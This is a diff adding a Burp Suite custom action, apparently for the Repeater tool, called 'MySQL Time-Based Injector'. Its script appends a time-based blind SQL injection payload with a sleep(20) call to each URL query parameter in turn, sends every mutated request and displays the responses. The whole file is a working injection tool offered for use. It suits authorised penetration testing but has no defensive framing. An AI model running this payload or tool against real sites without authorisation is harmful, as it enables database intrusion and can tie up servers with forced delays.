@@ -1,0 +1,37 @@
+id: 6d3849a7-6973-4f1f-b7db-ca61cf866f28
+name: MySQL Time-Based Injector
+function: CUSTOM_ACTION
+location: REPEATER
+source: |+
+  /**
+   * Append a time-based MySQL payload to each query parameter, one at a time.
+   * The action sends the modified requests sequentially so timing-based behavior
+   * can be observed via Logger or other Burp tools.
+   **/
+  var payload = "'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z";
+  var baseRequest = requestResponse.request();
+  if (baseRequest == null) return;
+  
+  var queryParameters = baseRequest.parameters()
+      .stream()
+      .filter(p -> p.type() == HttpParameterType.URL)
+      .toList();
+  
+  if (queryParameters.isEmpty()) return;
+  
+  for (HttpParameter parameter : queryParameters) {
+      var originalValue = parameter.value() == null ? "" : parameter.value();
+      var mutatedParameter = HttpParameter.parameter(
+          parameter.name(),
+          originalValue + payload,
+          parameter.type()
+      );
+      var mutatedRequest = baseRequest
+          .withRemovedParameters(parameter)
+          .withAddedParameters(mutatedParameter);
+      var response = api().http().sendRequest(mutatedRequest);
+      if (response.hasResponse()) {
+          httpEditor.responsePane().set(response.response().toByteArray());
+      }
+  }
+
